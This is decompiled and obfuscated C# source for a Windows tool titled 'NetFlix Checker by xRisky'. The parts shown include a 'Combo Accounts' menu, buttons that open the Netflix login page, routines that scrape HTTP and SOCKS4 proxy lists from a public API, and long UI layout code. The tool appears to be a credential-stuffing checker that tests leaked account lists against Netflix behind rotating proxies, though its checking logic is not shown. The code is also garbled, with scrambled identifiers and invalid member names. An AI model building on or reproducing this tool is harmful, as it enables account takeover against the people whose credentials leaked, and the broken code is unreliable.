								HMAC.ObjectAuditRule.Add(match3.Value.Replace("</td><td>", ":") + "\r\n");
							}
						}
						finally
						{
							IEnumerator enumerator3;
							if (enumerator3 is IDisposable)
							{
								(enumerator3 as IDisposable).Dispose();
							}
						}
						this.TypeResolveHandler.Text = " Load Proxies ( " + Conversions.ToString(HMAC.ObjectAuditRule.Count.ToString()) + " )";
					}
				}
				if (this.InvalidFilterCriteriaExceptionMdaHelper.Checked)
				{
					HMAC.ObjectAuditRule.Clear();
					using (HttpRequest httpRequest4 = new HttpRequest())
					{
						string input4 = httpRequest4.Get("https://proxyscrape.com/api/?request=displayproxies&proxytype=socks4&timeout=10000&country=all&anonymity=all&ssl=all/", null).ToString();
						MatchCollection matchCollection4 = Regex.Matches(input4, "\\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\b:\\d{2,5}");
						try
						{
							foreach (object obj4 in matchCollection4)
							{
								object objectValue4 = RuntimeHelpers.GetObjectValue(obj4);
								Match match4 = (Match)objectValue4;
								HMAC.ObjectAuditRule.Add(match4.Value.Replace("</td><td>", ":") + "\r\n");
							}
						}
						finally
						{
							IEnumerator enumerator4;
							if (enumerator4 is IDisposable)
							{
								(enumerator4 as IDisposable).Dispose();
							}
						}
						this.TypeResolveHandler.Text = " Load Proxies ( " + Conversions.ToString(HMAC.ObjectAuditRule.Count.ToString()) + " )";
					}
				}
				if (this.BinaryTypeEnum.Checked)
				{
					HMAC.ObjectAuditRule.Clear();
					using (HttpRequest httpRequest5 = new HttpRequest())
					{
						string input5 = httpRequest5.Get("https://proxyscrape.com/api/?request=displayproxies&proxytype=http&timeout=10000&country=all&ssl=all&anonymity=all", null).ToString();
						MatchCollection matchCollection5 = Regex.Matches(input5, "\\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\b:\\d{2,5}");
						try
						{
							foreach (object obj5 in matchCollection5)
							{
								object objectValue5 = RuntimeHelpers.GetObjectValue(obj5);
								Match match5 = (Match)objectValue5;
								HMAC.ObjectAuditRule.Add(match5.Value.Replace("</td><td>", ":") + "\r\n");
							}
						}
						finally
						{
							IEnumerator enumerator5;
							if (enumerator5 is IDisposable)
							{
								(enumerator5 as IDisposable).Dispose();
							}
						}
						this.TypeResolveHandler.Text = " Load Proxies ( " + Conversions.ToString(HMAC.ObjectAuditRule.Count.ToString()) + " )";
					}
				}
			}
			catch (Exception ex)
			{
				this.TypeResolveHandler.Text = "Load Proxies ( Error )";
			}
		}

		private void BaseInfoTable(object sender, EventArgs e)
		{
		}

		private void MscorlibCollectionDebugView1(object sender, EventArgs e)
		{
			Process.Start("https://www.netflix.com/login/");
		}

		private void TypeInfo(object sender, EventArgs e)
		{
			Process.Start("https://www.netflix.com/login/");
		}

		private void method_1(object sender, EventArgs e)
		{
			<Module>.SoapFieldAttribute(83);
			this.ParseFlags.BackColor = Color.FromArgb(35, 35, 35);
			this.SynchronizationContextPropertiesPredicate1.BackColor = Color.FromArgb(35, 35, 35);
		}

		private void ControlFlags(object sender, EventArgs e)
		{
			<Module>.SoapFieldAttribute(84);
			this.ParseFlags.BackColor = Color.FromArgb(35, 35, 35);
			this.SynchronizationContextPropertiesPredicate1.BackColor = Color.FromArgb(35, 35, 35);
		}

		private void NonSerializedAttributeTypeEntry(object sender, EventArgs e)
		{
			<Module>.SoapFieldAttribute(85);
			this.ParseFlags.BackColor = Color.FromArgb(60, 60, 60);
			this.SynchronizationContextPropertiesPredicate1.BackColor = Color.FromArgb(60, 60, 60);
		}

		private void StringSplitOptions(object sender, EventArgs e)
		{
			<Module>.SoapFieldAttribute(86);
			this.ParseFlags.BackColor = Color.FromArgb(60, 60, 60);
			this.SynchronizationContextPropertiesPredicate1.BackColor = Color.FromArgb(60, 60, 60);
		}

		[DebuggerNonUserCode]
		protected virtual void MethodCacheFlags(bool disposing)
		{
			<Module>.SoapFieldAttribute(87);
			try
			{
				if (disposing && this.FileLoadException != null)
				{
					this.FileLoadException.Dispose();
				}
			}
			finally
			{
				base.Dispose(disposing);
			}
		}

		[DebuggerStepThrough]
		private void MethodInfo()
		{
			<Module>.SoapFieldAttribute(88);
			this.FileLoadException = new Container();
			ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(ISection));
			DataGridViewCellStyle dataGridViewCellStyle = new DataGridViewCellStyle();
			DataGridViewCellStyle dataGridViewCellStyle2 = new DataGridViewCellStyle();
			DataGridViewCellStyle dataGridViewCellStyle3 = new DataGridViewCellStyle();
			this.AssemblyAttributesGoHere = new System.Windows.Forms.Timer(this.FileLoadException);
			this.IFileEntryReadObjectInfo = new ContextMenuStrip(this.FileLoadException);
			this.UCOMIEnumerable = new ToolStripMenuItem();
			this.ISecurableChannelAssemblyReferenceDependentAssemblyEntry = new System.Windows.Forms.Timer(this.FileLoadException);
			this.IDelayEvaluatedEvidence = new AnimaForm();
			this.OptionalFieldAttribute = new Panel();
			this.AssemblyRequestEntryFieldId = new PictureBox();
			this.InternalParseStateE = new MetroLabel();
			this.SendOrPostCallback = new PictureBox();
			this.Attributes = new PictureBox();
			this.UrlAttribute = new PictureBox();
			this.KeyContainerPermissionAccessEntry = new PictureBox();
			this.SafeCertStoreHandle = new Panel();
			this.EmptyReadOnlyDictionaryInternal = new Label();
			this.DefaultFilter = new Site();
			this.HostProtectionAttribute = new TabPage();
			this.NullTextReader = new Panel();
			this.MarshalByRefObject = new MetroTextbox();
			this.ExceptionInfo = new PictureBox();
			this.AssemblyAlgorithmIdAttribute = new PictureBox();
			this.ISerializable = new IExpando();
			this.AssemblyRequestEntryFieldIdKoreanLunisolarCalendar = new MetroTrackbar();
			this.IDescriptionMetadataEntry = new MetroLabel();
			this.TOKENPRIVILEGE = new MetroChecker();
			this.ConvertUnverifiableCodeAttribute = new Panel();
			this.TypeResolveHandler = new IExpando();
			this.EventItfInfo = new PictureBox();
			this.SafeTokenHandle = new PictureBox();
			this.RawAclWellKnownSidType = new Panel();
			this.SharedStatics = new MetroTrackbar();
			this.ISCIIDecoder = new MetroLabel();
			this.RawSecurityDescriptor = new MetroChecker();
			this.JitHelpers = new MetroChecker();
			this.ThreadPoolGlobals = new MetroChecker();
			this.FileAttributes = new MetroChecker();
			this.InvalidFilterCriteriaExceptionMdaHelper = new MetroChecker();
			this.BinaryTypeEnum = new MetroChecker();
			this.ComMemberType = new Panel();
			this.X509CertificateCMSHASHDIGESTMETHOD = new Panel();
			this.CompressedStackRunData = new Panel();
			this.RuntimeEventInfo = new DataGridView();
			this.ObjectCloneHelper = new DataGridViewTextBoxColumn();
			this.LogSwitch = new DataGridViewTextBoxColumn();
			this.AllMembershipConditionEncoderExceptionFallback = new DataGridViewTextBoxColumn();
			this.WindowsPrincipal = new DataGridViewTextBoxColumn();
			this.InputRecord = new DataGridViewTextBoxColumn();
			this.GCSettings = new DataGridViewTextBoxColumn();
			this.RemotingException = new DataGridViewTextBoxColumn();
			this.IMembershipConditionDelegateBindingFlags = new Panel();
			this.SynchronizationContextPropertiesPredicate1 = new PictureBox();
			this.ParseFlags = new PictureBox();
			this.NamedPermissionSet = new Label();
			this.BinaryMethodCallSearchOption = new Label();
			this.TypeBuilderInstantiation = new Panel();
			this.InvalidFilterCriteriaException = new Panel();
			this.UnmanagedFunctionPointerAttribute = new Label();
			this.DictionaryBase = new Label();
			this.Stream = new Label();
			this.LocalBuilderContextAttributeEntry = new Label();
			this.StoreCategoryEnumeration = new Label();
			this.NullStream = new Label();
			this.StateManagerRunningState = new Label();
			this.MdaState = new Label();
			this.FileStreamAsyncResult = new Label();
			this.ApplicationTrustEnumerator = new Label();
			this.Currency = new Label();
			this.MarshalAsAttributeCodeGroupStack = new Label();
			this.CompositeCultureData = new Label();
			this.BadImageFormatException = new Label();
			this.XmlNamespaceEncoderDecoderFallbackBuffer = new Label();
			this.IMuiResourceIdLookupMapEntry = new Label();
			this.SZArrayEnumerator = new Panel();
			this.SoapIntegerInt32 = new ScopeTreeLCIDConversionAttribute();
			this.TOKENGROUPSOverlappedDataCacheLine = new MetroComboBox();
			this.ThreadPool = new Panel();
			this.DateBuffer = new Panel();
			this.ResolveEventArgsSHA384 = new ScopeTreeLCIDConversionAttribute();
			this.ScopeTree = new ScopeTreeLCIDConversionAttribute();
			this.TypeLibConverter = new Label();
			this.CompatibilityFlag = new IExpando();
			this.CrossAppDomainSink = new Panel();
			this.ThreadStart = new MetroTrackbar();
			this.Context = new MetroTrackbar();
			this.AssemblyBuilderAccess = new IExpando();
			this.DTFIUserOverrideValuesCustomAttributeData = new IExpando();
			this.CMSHASHDIGESTMETHOD = new IExpando();
			this.IEnumSTORECATEGORYSUBCATEGORY = new Label();
			this.AceFlags = new Label();
			this.CrossAppDomainChannel = new Label();
			this.MethodImplAttribute = new Label();
			this.SoapNcName = new Label();
			this.ThreadStaticAttributeCultureTableItem = new Label();
			this.AppDomainUnloadedException = new IExpando();
			this.DateTime = new TabPage();
			this.SafeProcessHandleLCIDConversionAttribute = new Panel();
			this.ISymbolDocumentWriter = new IExpando();
			this.RegistrySecurity = new IExpando();
			this.LSATRANSLATEDNAME = new Label();
			this.SpecialPermissionSetFlagCustAttr = new Label();
			this.STORECATEGORYINSTANCE = new Panel();
			this.SearchData = new IExpando();
			this.Signature = new IExpando();
			this.IsolatedStorageException = new IExpando();
			this.LocalBuilder = new IExpando();
			this.ThreadHelper = new IExpando();
			this.AsymmetricSignatureDeformatter = new IExpando();
			this.AssemblyLoadEventHandler = new Label();
			this.CerHashtable2 = new Label();
			this.CharUnicodeInfo = new Label();
			this.IDictionary2 = new Label();
			this.KeyContainerPermissionAccessEntryEnumeratorCMSASSEMBLYDEPLOYMENTFLAG = new Label();
			this.ITypeInfo2 = new Panel();
			this.UTF8EncodingAppDomainLevelActivator = new IExpando();
			this.SynchronizationContextProperties = new PictureBox();
			this.CATEGORYSUBCATEGORYInternalRemotingServices = new PictureBox();
			this.MissingManifestResourceException = new Label();
			this.MscorlibDictionaryKeyCollectionDebugView2 = new Panel();
			this.AssertFilters = new IExpando();
			this.TypeAttributes = new IExpando();
			this.UCOMITypeLib = new Label();
			this.ICryptoTransform = new Label();
			this.IFileEntryReadObjectInfo.SuspendLayout();
			this.IDelayEvaluatedEvidence.SuspendLayout();
			this.OptionalFieldAttribute.SuspendLayout();
			((ISupportInitialize)this.AssemblyRequestEntryFieldId).BeginInit();
			((ISupportInitialize)this.SendOrPostCallback).BeginInit();
			((ISupportInitialize)this.Attributes).BeginInit();
			((ISupportInitialize)this.UrlAttribute).BeginInit();
			((ISupportInitialize)this.KeyContainerPermissionAccessEntry).BeginInit();
			this.DefaultFilter.SuspendLayout();
			this.HostProtectionAttribute.SuspendLayout();
			this.NullTextReader.SuspendLayout();
			((ISupportInitialize)this.ExceptionInfo).BeginInit();
			((ISupportInitialize)this.AssemblyAlgorithmIdAttribute).BeginInit();
			this.ConvertUnverifiableCodeAttribute.SuspendLayout();
			((ISupportInitialize)this.EventItfInfo).BeginInit();
			((ISupportInitialize)this.SafeTokenHandle).BeginInit();
			((ISupportInitialize)this.RuntimeEventInfo).BeginInit();
			this.IMembershipConditionDelegateBindingFlags.SuspendLayout();
			((ISupportInitialize)this.SynchronizationContextPropertiesPredicate1).BeginInit();
			((ISupportInitialize)this.ParseFlags).BeginInit();
			this.SZArrayEnumerator.SuspendLayout();
			this.CrossAppDomainSink.SuspendLayout();
			this.DateTime.SuspendLayout();
			this.SafeProcessHandleLCIDConversionAttribute.SuspendLayout();
			this.STORECATEGORYINSTANCE.SuspendLayout();
			this.ITypeInfo2.SuspendLayout();
			((ISupportInitialize)this.SynchronizationContextProperties).BeginInit();
			((ISupportInitialize)this.CATEGORYSUBCATEGORYInternalRemotingServices).BeginInit();
			this.MscorlibDictionaryKeyCollectionDebugView2.SuspendLayout();
			base.SuspendLayout();
			this.IFileEntryReadObjectInfo.Items.AddRange(new ToolStripItem[]
			{
				this.UCOMIEnumerable
			});
			this.IFileEntryReadObjectInfo.Name = "ContextMenuStrip1";
			this.IFileEntryReadObjectInfo.Size = new Size(161, 26);
			this.UCOMIEnumerable.Alignment = ToolStripItemAlignment.Right;
			this.UCOMIEnumerable.BackColor = Color.Transparent;
			this.UCOMIEnumerable.BackgroundImageLayout = ImageLayout.None;
			this.UCOMIEnumerable.ForeColor = Color.Black;
			this.UCOMIEnumerable.Name = "ComboAccountsToolStripMenuItem";
			this.UCOMIEnumerable.ShowShortcutKeys = false;
			this.UCOMIEnumerable.Size = new Size(160, 22);
			this.UCOMIEnumerable.Text = "Combo Accounts";
			this.IDelayEvaluatedEvidence.BackColor = Color.FromArgb(40, 40, 40);
			this.IDelayEvaluatedEvidence.BackgroundImageLayout = ImageLayout.None;
			this.IDelayEvaluatedEvidence.Controls.Add(this.OptionalFieldAttribute);
			this.IDelayEvaluatedEvidence.Controls.Add(this.SafeCertStoreHandle);
			this.IDelayEvaluatedEvidence.Controls.Add(this.EmptyReadOnlyDictionaryInternal);
			this.IDelayEvaluatedEvidence.Controls.Add(this.DefaultFilter);
			this.IDelayEvaluatedEvidence.Dock = DockStyle.Left;
			this.IDelayEvaluatedEvidence.Font = new Font("Segoe UI", 10f);
			this.IDelayEvaluatedEvidence.ForeColor = Color.FromArgb(200, 200, 200);
			this.IDelayEvaluatedEvidence.Location = new Point(0, 0);
			this.IDelayEvaluatedEvidence.Name = "AnimaForm1";
			this.IDelayEvaluatedEvidence.Size = new Size(1312, 564);
			this.IDelayEvaluatedEvidence.TabIndex = 0;
			this.OptionalFieldAttribute.BackColor = Color.FromArgb(45, 45, 48);
			this.OptionalFieldAttribute.Controls.Add(this.AssemblyRequestEntryFieldId);
			this.OptionalFieldAttribute.Controls.Add(this.InternalParseStateE);
			this.OptionalFieldAttribute.Controls.Add(this.SendOrPostCallback);
			this.OptionalFieldAttribute.Controls.Add(this.Attributes);
			this.OptionalFieldAttribute.Controls.Add(this.UrlAttribute);
			this.OptionalFieldAttribute.Controls.Add(this.KeyContainerPermissionAccessEntry);
			this.OptionalFieldAttribute.Location = new Point(0, 0);
			this.OptionalFieldAttribute.Name = "Panel16";
			this.OptionalFieldAttribute.Size = new Size(1310, 29);
			this.OptionalFieldAttribute.TabIndex = 89;
			this.AssemblyRequestEntryFieldId.BackColor = Color.FromArgb(45, 45, 48);
			this.AssemblyRequestEntryFieldId.BackgroundImageLayout = ImageLayout.Center;
			this.AssemblyRequestEntryFieldId.Image = (Image)componentResourceManager.GetObject("PictureBox2.Image");
			this.AssemblyRequestEntryFieldId.Location = new Point(9, 4);
			this.AssemblyRequestEntryFieldId.Name = "PictureBox2";
			this.AssemblyRequestEntryFieldId.Size = new Size(20, 20);
			this.AssemblyRequestEntryFieldId.SizeMode = PictureBoxSizeMode.Zoom;
			this.AssemblyRequestEntryFieldId.TabIndex = 32;
			this.AssemblyRequestEntryFieldId.TabStop = false;
			this.InternalParseStateE.AutoSize = true;
			this.InternalParseStateE.BackColor = Color.Transparent;
			this.InternalParseStateE.Font = new Font("Segoe UI", 10f);
			this.InternalParseStateE.ForeColor = Color.White;
			this.InternalParseStateE.Location = new Point(550, 5);
			this.InternalParseStateE.Name = "MetroLabel6";
			this.InternalParseStateE.Size = new Size(163, 19);
			this.InternalParseStateE.TabIndex = 3;
			this.InternalParseStateE.Text = "NetFlix Checker by xRisky";
			this.SendOrPostCallback.BackColor = Color.FromArgb(45, 45, 48);
			this.SendOrPostCallback.BackgroundImageLayout = ImageLayout.Center;
			this.SendOrPostCallback.Image = (Image)componentResourceManager.GetObject("PictureBox5.Image");
			this.SendOrPostCallback.Location = new Point(1251, 10);
			this.SendOrPostCallback.Margin = new Padding(3, 4, 3, 4);
			this.SendOrPostCallback.Name = "PictureBox5";
			this.SendOrPostCallback.Size = new Size(12, 12);
			this.SendOrPostCallback.SizeMode = PictureBoxSizeMode.StretchImage;
			this.SendOrPostCallback.TabIndex = 30;
			this.SendOrPostCallback.TabStop = false;
			this.Attributes.BackColor = Color.FromArgb(45, 45, 48);
			this.Attributes.BackgroundImageLayout = ImageLayout.Center;
			this.Attributes.Image = (Image)componentResourceManager.GetObject("PictureBox1.Image");
			this.Attributes.Location = new Point(1286, 10);
			this.Attributes.Margin = new Padding(3, 4, 3, 4);
			this.Attributes.Name = "PictureBox1";
			this.Attributes.Size = new Size(10, 9);
			this.Attributes.SizeMode = PictureBoxSizeMode.StretchImage;
			this.Attributes.TabIndex = 28;
			this.Attributes.TabStop = false;
			this.UrlAttribute.BackColor = Color.FromArgb(45, 45, 48);
			this.UrlAttribute.BackgroundImageLayout = ImageLayout.Center;
			this.UrlAttribute.Location = new Point(1275, 0);
			this.UrlAttribute.Margin = new Padding(3, 4, 3, 4);
			this.UrlAttribute.Name = "PictureBox3";
			this.UrlAttribute.Size = new Size(34, 29);
			this.UrlAttribute.SizeMode = PictureBoxSizeMode.StretchImage;
			this.UrlAttribute.TabIndex = 27;
			this.UrlAttribute.TabStop = false;
			this.KeyContainerPermissionAccessEntry.BackColor = Color.FromArgb(45, 45, 48);
			this.KeyContainerPermissionAccessEntry.BackgroundImageLayout = ImageLayout.Center;
			this.KeyContainerPermissionAccessEntry.Location = new Point(1240, 0);
			this.KeyContainerPermissionAccessEntry.Margin = new Padding(3, 4, 3, 4);
			this.KeyContainerPermissionAccessEntry.Name = "PictureBox4";
			this.KeyContainerPermissionAccessEntry.Size = new Size(34, 29);
			this.KeyContainerPermissionAccessEntry.SizeMode = PictureBoxSizeMode.StretchImage;
			this.KeyContainerPermissionAccessEntry.TabIndex = 29;
			this.KeyContainerPermissionAccessEntry.TabStop = false;
			this.SafeCertStoreHandle.BackColor = Color.FromArgb(40, 40, 40);
			this.SafeCertStoreHandle.Cursor = Cursors.Default;
			this.SafeCertStoreHandle.Location = new Point(0, -9);
			this.SafeCertStoreHandle.Name = "Panel15";
			this.SafeCertStoreHandle.Size = new Size(1317, 10);
			this.SafeCertStoreHandle.TabIndex = 88;
			this.EmptyReadOnlyDictionaryInternal.AutoSize = true;
			this.EmptyReadOnlyDictionaryInternal.Font = new Font("Segoe UI", 9f);
			this.EmptyReadOnlyDictionaryInternal.Location = new Point(38, 33);
			this.EmptyReadOnlyDictionaryInternal.Name = "Label1";
			this.EmptyReadOnlyDictionaryInternal.Size = new Size(40, 15);
			this.EmptyReadOnlyDictionaryInternal.TabIndex = 0;
			this.EmptyReadOnlyDictionaryInternal.Text = "About";
			this.EmptyReadOnlyDictionaryInternal.TextAlign = ContentAlignment.MiddleCenter;
			this.DefaultFilter.Controls.Add(this.HostProtectionAttribute);
			this.DefaultFilter.Controls.Add(this.DateTime);
			this.DefaultFilter.Font = new Font("Segoe UI", 9f);
			this.DefaultFilter.ForeColor = Color.FromArgb(200, 200, 200);
			this.DefaultFilter.ItemSize = new Size(18, 18);
			this.DefaultFilter.Location = new Point(0, 30);
			this.DefaultFilter.Multiline = true;
			this.DefaultFilter.Name = "AnimaTabControl1";
			this.DefaultFilter.SelectedIndex = 0;
			this.DefaultFilter.ShowToolTips = true;
			this.DefaultFilter.Size = new Size(1309, 531);
			this.DefaultFilter.SizeMode = TabSizeMode.Fixed;
			this.DefaultFilter.TabIndex = 18;
			this.HostProtectionAttribute.BackColor = Color.FromArgb(40, 40, 40);
			this.HostProtectionAttribute.BorderStyle = BorderStyle.FixedSingle;
			this.HostProtectionAttribute.Controls.Add(this.NullTextReader);
			this.HostProtectionAttribute.Controls.Add(this.ConvertUnverifiableCodeAttribute);
			this.HostProtectionAttribute.Controls.Add(this.ComMemberType);
			this.HostProtectionAttribute.Controls.Add(this.X509CertificateCMSHASHDIGESTMETHOD);
			this.HostProtectionAttribute.Controls.Add(this.CompressedStackRunData);
			this.HostProtectionAttribute.Controls.Add(this.RuntimeEventInfo);
			this.HostProtectionAttribute.Controls.Add(this.IMembershipConditionDelegateBindingFlags);
			this.HostProtectionAttribute.Controls.Add(this.SZArrayEnumerator);
			this.HostProtectionAttribute.Controls.Add(this.CrossAppDomainSink);
			this.HostProtectionAttribute.Cursor = Cursors.Default;
			this.HostProtectionAttribute.Font = new Font("Segoe UI", 9f);
			this.HostProtectionAttribute.ForeColor = Color.FromArgb(200, 200, 200);
			this.HostProtectionAttribute.Location = new Point(4, 22);
			this.HostProtectionAttribute.Name = "TabPage1";
			this.HostProtectionAttribute.Padding = new Padding(3);
			this.HostProtectionAttribute.RightToLeft = RightToLeft.Yes;
			this.HostProtectionAttribute.Size = new Size(1301, 505);
			this.HostProtectionAttribute.TabIndex = 0;
			this.HostProtectionAttribute.Text = "TabPage1";
			this.NullTextReader.BackColor = Color.FromArgb(35, 35, 35);
			this.NullTextReader.Controls.Add(this.MarshalByRefObject);
			this.NullTextReader.Controls.Add(this.ExceptionInfo);
			this.NullTextReader.Controls.Add(this.AssemblyAlgorithmIdAttribute);
			this.NullTextReader.Controls.Add(this.ISerializable);
			this.NullTextReader.Controls.Add(this.AssemblyRequestEntryFieldIdKoreanLunisolarCalendar);
			this.NullTextReader.Controls.Add(this.IDescriptionMetadataEntry);
			this.NullTextReader.Controls.Add(this.TOKENPRIVILEGE);
			this.NullTextReader.Cursor = Cursors.Default;
			this.NullTextReader.Location = new Point(245, 314);
			this.NullTextReader.Name = "Panel19";
			this.NullTextReader.Size = new Size(226, 179);
			this.NullTextReader.TabIndex = 88;
			this.MarshalByRefObject.AutoStyle = false;
			this.MarshalByRefObject.BackgroundImageLayout = ImageLayout.None;
			this.MarshalByRefObject.BorderColor = Color.FromArgb(98, 98, 98);
			this.MarshalByRefObject.DefaultColor = Color.FromArgb(40, 40, 40);
			this.MarshalByRefObject.DisabledColor = Color.FromArgb(35, 35, 35);
			this.MarshalByRefObject.Font = new Font("Segoe UI", 9f);
			this.MarshalByRefObject.ForeColor = Color.White;
			this.MarshalByRefObject.HideSelection = false;
			this.MarshalByRefObject.HoverColor = Color.FromArgb(0, 122, 204);
			this.MarshalByRefObject.Location = new Point(16, 18);
			this.MarshalByRefObject.Name = "MetroTextbox1";
			this.MarshalByRefObject.PasswordChar = '\0';
			this.MarshalByRefObject.Size = new Size(197, 23);
			this.MarshalByRefObject.Style = Design.Style.Custom;
			this.MarshalByRefObject.TabIndex = 25;
			this.MarshalByRefObject.Text = "Link";
			this.MarshalByRefObject.TextAlign = HorizontalAlignment.Center;
			this.ExceptionInfo.BackColor = Color.FromArgb(35, 35, 35);
			this.ExceptionInfo.BackgroundImageLayout = ImageLayout.Center;
			this.ExceptionInfo.Image = (Image)componentResourceManager.GetObject("PictureBox10.Image");
			this.ExceptionInfo.Location = new Point(174, 63);
			this.ExceptionInfo.Name = "PictureBox10";
			this.ExceptionInfo.Size = new Size(20, 20);
			this.ExceptionInfo.SizeMode = PictureBoxSizeMode.StretchImage;
			this.ExceptionInfo.TabIndex = 74;
			this.ExceptionInfo.TabStop = false;
			this.AssemblyAlgorithmIdAttribute.BackColor = Color.FromArgb(35, 35, 35);
			this.AssemblyAlgorithmIdAttribute.BackgroundImageLayout = ImageLayout.Center;
			this.AssemblyAlgorithmIdAttribute.Location = new Point(170, 60);
			this.AssemblyAlgorithmIdAttribute.Name = "PictureBox11";
			this.AssemblyAlgorithmIdAttribute.Size = new Size(27, 27);
			this.AssemblyAlgorithmIdAttribute.SizeMode = PictureBoxSizeMode.StretchImage;
			this.AssemblyAlgorithmIdAttribute.TabIndex = 73;
			this.AssemblyAlgorithmIdAttribute.TabStop = false;
			this.ISerializable.AllowDrop = true;
			this.ISerializable.Font = new Font("Segoe UI", 9f);
			this.ISerializable.ForeColor = Color.FromArgb(200, 200, 200);
			this.ISerializable.PrivateImplementationDetails{E61C418B-EF2D-4D3C-A0C2-E7E9B2B2EF81} = new Point(30, 6);
			this.ISerializable.IAsyncResultIDENTITYATTRIBUTE = new Size(14, 14);
			this.ISerializable.Location = new Point(14, 131);
			this.ISerializable.Name = "AnimaButton6";
			this.ISerializable.Size = new Size(197, 29);
			this.ISerializable.TabIndex = 22;
			this.ISerializable.Text = "Load Proxies";
			this.ISerializable.UseVisualStyleBackColor = true;
			this.AssemblyRequestEntryFieldIdKoreanLunisolarCalendar.AutoStyle = false;
			this.AssemblyRequestEntryFieldIdKoreanLunisolarCalendar.BackColor = Color.Transparent;
			this.AssemblyRequestEntryFieldIdKoreanLunisolarCalendar.BackgroundImageLayout = ImageLayout.None;
			this.AssemblyRequestEntryFieldIdKoreanLunisolarCalendar.BorderColor = Color.FromArgb(98, 98, 98);
			this.AssemblyRequestEntryFieldIdKoreanLunisolarCalendar.GradientColor = Color.FromArgb(40, 40, 40);
			this.AssemblyRequestEntryFieldIdKoreanLunisolarCalendar.HoverColor = Color.FromArgb(40, 40, 40);
			this.AssemblyRequestEntryFieldIdKoreanLunisolarCalendar.LeftColor = Color.FromArgb(0, 122, 204);
			this.AssemblyRequestEntryFieldIdKoreanLunisolarCalendar.Location = new Point(16, 97);
			this.AssemblyRequestEntryFieldIdKoreanLunisolarCalendar.Maximum = 120;
			this.AssemblyRequestEntryFieldIdKoreanLunisolarCalendar.Minimum = 1;
			this.AssemblyRequestEntryFieldIdKoreanLunisolarCalendar.Name = "MetroTrackbar3";
			this.AssemblyRequestEntryFieldIdKoreanLunisolarCalendar.RegionColor = Color.FromArgb(0, 153, 255);
			this.AssemblyRequestEntryFieldIdKoreanLunisolarCalendar.RightColor = Color.FromArgb(63, 63, 63);
			this.AssemblyRequestEntryFieldIdKoreanLunisolarCalendar.Size = new Size(197, 15);
			this.AssemblyRequestEntryFieldIdKoreanLunisolarCalendar.SliderColor = Color.FromArgb(40, 40, 40);
			this.AssemblyRequestEntryFieldIdKoreanLunisolarCalendar.SliderWidth = 6;
			this.AssemblyRequestEntryFieldIdKoreanLunisolarCalendar.Style = Design.Style.Custom;
			this.AssemblyRequestEntryFieldIdKoreanLunisolarCalendar.TabIndex = 26;
			this.AssemblyRequestEntryFieldIdKoreanLunisolarCalendar.Value = 2;
			this.IDescriptionMetadataEntry.AutoSize = true;
			this.IDescriptionMetadataEntry.BackColor = Color.Transparent;
			this.IDescriptionMetadataEntry.Font = new Font("Segoe UI", 10f);
			this.IDescriptionMetadataEntry.ForeColor = Color.White;
			this.IDescriptionMetadataEntry.Location = new Point(120, 63);
			this.IDescriptionMetadataEntry.Name = "MetroLabel5";
			this.IDescriptionMetadataEntry.RightToLeft = RightToLeft.No;
			this.IDescriptionMetadataEntry.Size = new Size(45, 19);
			this.IDescriptionMetadataEntry.TabIndex = 27;
			this.IDescriptionMetadataEntry.Text = "2 Min";
			this.TOKENPRIVILEGE.BackColor = Color.FromArgb(35, 35, 35);
			this.TOKENPRIVILEGE.BackgroundImageLayout = ImageLayout.None;
			this.TOKENPRIVILEGE.CheckColor = Color.FromArgb(0, 122, 204);
			this.TOKENPRIVILEGE.CheckedBorderColor = Color.FromArgb(98, 98, 98);
			this.TOKENPRIVILEGE.DefaultColor = Color.FromArgb(63, 63, 63);
			this.TOKENPRIVILEGE.Font = new Font("Segoe UI", 10f);
			this.TOKENPRIVILEGE.ForeColor = Color.White;
			this.TOKENPRIVILEGE.HoverColor = Color.FromArgb(98, 98, 98);
			this.TOKENPRIVILEGE.Location = new Point(22, 65);
			this.TOKENPRIVILEGE.Name = "MetroChecker3";
			this.TOKENPRIVILEGE.PressedColor = Color.FromArgb(0, 99, 165);
			this.TOKENPRIVILEGE.Size = new Size(105, 14);
			this.TOKENPRIVILEGE.Style = Design.Style.Custom;
			this.TOKENPRIVILEGE.TabIndex = 28;
			this.TOKENPRIVILEGE.Text = "Auto Update :";
			this.ConvertUnverifiableCodeAttribute.BackColor = Color.FromArgb(35, 35, 35);
			this.ConvertUnverifiableCodeAttribute.Controls.Add(this.TypeResolveHandler);
			this.ConvertUnverifiableCodeAttribute.Controls.Add(this.EventItfInfo);
			this.ConvertUnverifiableCodeAttribute.Controls.Add(this.SafeTokenHandle);
			this.ConvertUnverifiableCodeAttribute.Controls.Add(this.RawAclWellKnownSidType);
			this.ConvertUnverifiableCodeAttribute.Controls.Add(this.SharedStatics);
			this.ConvertUnverifiableCodeAttribute.Controls.Add(this.ISCIIDecoder);
			this.ConvertUnverifiableCodeAttribute.Controls.Add(this.RawSecurityDescriptor);
			this.ConvertUnverifiableCodeAttribute.Controls.Add(this.JitHelpers);
			this.ConvertUnverifiableCodeAttribute.Controls.Add(this.ThreadPoolGlobals);
			this.ConvertUnverifiableCodeAttribute.Controls.Add(this.FileAttributes);
			this.ConvertUnverifiableCodeAttribute.Controls.Add(this.InvalidFilterCriteriaExceptionMdaHelper);
			this.ConvertUnverifiableCodeAttribute.Controls.Add(this.BinaryTypeEnum);
			this.ConvertUnverifiableCodeAttribute.Location = new Point(518, 38);
			this.ConvertUnverifiableCodeAttribute.Name = "Panel17";
			this.ConvertUnverifiableCodeAttribute.Size = new Size(227, 298);
			this.ConvertUnverifiableCodeAttribute.TabIndex = 30;
			this.ConvertUnverifiableCodeAttribute.Visible = false;
			this.TypeResolveHandler.AllowDrop = true;
			this.TypeResolveHandler.Font = new Font("Segoe UI", 9f);
			this.TypeResolveHandler.ForeColor = Color.FromArgb(200, 200, 200);
			this.TypeResolveHandler.PrivateImplementationDetails{E61C418B-EF2D-4D3C-A0C2-E7E9B2B2EF81} = new Point(30, 6);
			this.TypeResolveHandler.IAsyncResultIDENTITYATTRIBUTE = new Size(14, 14);
			this.TypeResolveHandler.Location = new Point(18, 256);
			this.TypeResolveHandler.Name = "MetroButton7";
			this.TypeResolveHandler.Size = new Size(197, 29);
			this.TypeResolveHandler.TabIndex = 71;
			this.TypeResolveHandler.Text = "Load Proxies";
